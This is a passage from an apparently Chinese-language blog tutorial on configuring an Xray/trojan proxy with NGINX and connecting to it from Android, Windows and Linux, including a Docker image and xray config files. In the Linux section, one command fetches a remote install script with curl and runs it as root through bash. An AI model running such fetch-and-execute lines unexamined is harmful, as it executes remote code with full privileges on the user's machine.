&#125;<br>                <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:和xray配置相同的你的自定义本地监听端口，例如11451;<br>                <span class="hljs-attribute">proxy_intercept_errors</span> <span class="hljs-literal">on</span>;<br>                <span class="hljs-attribute">error_page</span> <span class="hljs-number">400</span> = https://你自己的域名/;<br><br>                <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> Upgrade <span class="hljs-variable">$http_upgrade</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-string">&quot;upgrade&quot;</span>;<br>                <span class="hljs-attribute">proxy_read_timeout</span> <span class="hljs-number">600s</span>;<br><br>                <span class="hljs-attribute">proxy_set_header</span> X-Read-IP <span class="hljs-variable">$remote_addr</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后按惯例重启 NGINX：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart nginx.service</span><br></code></pre></td></tr></table></figure><p>至此，服务端侧的配置全部完成</p><h1 id="0x03-连接代理服务器"><a href="#0x03-连接代理服务器" class="headerlink" title="0x03. 连接代理服务器"></a>0x03. 连接代理服务器</h1><h2 id="在-Android-手机上进行连接"><a href="#在-Android-手机上进行连接" class="headerlink" title="在 Android 手机上进行连接"></a>在 Android 手机上进行连接</h2><p>既然最初的目的是玩原神，那么首先肯定要先看看在手机上如何配置</p><p>对于 Android 系统，可以在 Google Play 商店下载 v2rayNG，手动输入 trojan 相关配置即可，注意地址和 host 仅写域名，不要把 <code>https://</code> 和子路径也给写进去了：</p><p><img src="https://s2.loli.net/2024/09/19/5KhrJYWVHeQqPmc.jpg"></p><p>测试，成功迁移到笔者在 Vultr 购买的位于 Singapore 的服务器：</p><p><img src="https://s2.loli.net/2024/09/19/SvTfzqpi2e5RsjK.jpg"></p><h2 id="在-Windows-上进行连接"><a href="#在-Windows-上进行连接" class="headerlink" title="在 Windows 上进行连接"></a>在 Windows 上进行连接</h2><p>大部分人物理机用的应该还是 Windows，但是笔者不用 Windows，所以这里笔者仅给一个 Windows 下大概能用的方案： ）</p><p>使用 <a href="https://github.com/2dust/v2rayN">v2rayN</a> 按照下面的方式配置就行，注意地址仅写域名，不要把 <code>https://</code> 和子路径也给写进去了，否则会报 <code>too many colon in address</code> 的错误，端口默认写 443，传输方式里的路径带上 <code>/</code> ：</p><p><img src="https://s2.loli.net/2024/09/18/8bGpnTSxU716L9v.png"></p><p>然后在系统设置里配置一下手动代理即可：</p><p><img src="https://s2.loli.net/2024/09/18/jCRKBgI9yecsL8b.png"></p><p>测试，成功迁移到笔者在 Vultr 购买的位于 Singapore 的服务器：</p><p><img src="https://s2.loli.net/2024/09/18/kaslX7NpQe3BLRE.png"></p><h2 id="在-Linux-上进行连接"><a href="#在-Linux-上进行连接" class="headerlink" title="在 Linux 上进行连接"></a>在 Linux 上进行连接</h2><h3 id="方法一：使用-Docker-配置本地代理"><a href="#方法一：使用-Docker-配置本地代理" class="headerlink" title="方法一：使用 Docker 配置本地代理"></a>方法一：使用 Docker 配置本地代理</h3><p>docker 相对而言比较安全（ <del>如果真有人抽象到在上游供应链里放一个 kernel 通杀 0day 来劫持👴的电脑当肉鸡那👴也认了</del> ），而且也没有对不同发行版环境的要求，因此笔者首推使用 docker 配置本地的代理，我们只需要把 http 请求转发到 Docker 容器中的 xray 代理就行</p><p>我们首先按惯例编写一份 <code>config.json</code> ：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 本地代理端口例如<span class="hljs-number">11450</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;routeOnly&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;allowTransparent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 本地代理端口例如<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;routeOnly&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;allowTransparent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chacha20&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;ota&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的密码&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">443</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;security&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;tls&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;tlsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;allowInsecure&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;serverName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fingerprint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chrome&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/你的子路径&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;mux&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;concurrency&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;direct&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;response&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;hosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dns.google&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;proxy.example.com&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;你的域名&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geosite:cn&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;geosite:geolocation-cn&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;expectIPs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geoip:cn&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;1.1.1.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;https://dns.google/dns-query&quot;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;domainStrategy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AsIs&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;rules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;inboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;api&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;api&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;443&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;udp&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0-65535&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>因为镜像其实不难写所以我们直接自己写一个 Dockerfile ，不过官方安装脚本仅适用于 systemd（ <del>虽然笔者不使用 OpenRC 但是还是震怒了</del> ），但是直接把 xray 的二进制可执行文件拉下来运行其实也行：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> debian:latest<br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl wget unzip procps</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -P /root/ https://github.com/XTLS/Xray-core/releases/download/v1.8.24/Xray-linux-64.zip</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> unzip /root/Xray-linux-64.zip -d /root/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/xray</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./config.json /root/config.json</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\n/root/xray run -config /root/config.json\nsleep infinity&quot;</span> &gt; /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /var/log/xray</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>接下来构建镜像，启动容器，并让容器与主机使用同样的网络：</p><blockquote><p>之所以不用端口转发是因为 docker 的端口转发在笔者本地似乎有些小问题，没有办法连接……（但是转发 ssh 又可以，有点奇怪）</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t a3xray .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --name=a3xray --network=host a3xray</span><br></code></pre></td></tr></table></figure><p>然后找自己桌面环境对应的 Proxy 设置即可，以下是 KDE 环境下配置成功的界面：</p><p><img src="https://s2.loli.net/2024/09/19/HcYb9dBQ6vDImMO.png"></p><h3 id="方法二：直接在真机上安装客户端"><a href="#方法二：直接在真机上安装客户端" class="headerlink" title="方法二：直接在真机上安装客户端"></a>方法二：直接在真机上安装客户端</h3><p>笔者物理机使用的是 openSUSE Tumbleweed，默认使用 systemd ，所以也可以直接使用官方提供的一键式安装脚本在本地进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo bash -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)</span>&quot;</span> @ install</span><br></code></pre></td></tr></table></figure><p>然后编写 <code>/usr/local/etc/xray/config.json</code> ：</p><blockquote><p>这里笔者直接用 Windows 上 v2rayN 自动导出的，再稍微格式化了一下，懒得自己写了：）</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 